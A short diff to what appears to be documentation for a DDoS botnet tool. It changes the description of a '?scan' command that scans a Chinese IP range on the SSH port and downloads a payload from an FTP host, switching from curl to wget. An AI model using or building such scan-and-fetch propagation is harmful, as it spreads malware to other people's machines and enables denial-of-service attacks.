@@ -118,7 +118,7 @@ Main DDoS function is on <strong>The Application layer</strong>.
   <li><strong>?scan [ftp server]</li></strong>
     <ul>
       <li>?scan ftp://192.186.1.16/payload</li>
-      - Scan CHN ip range(By default.) on SSH port and get payload with curl.
+      - Scan CHN ip range(By default.) on SSH port and get payload with wget.
     </ul>
 </ul>
 
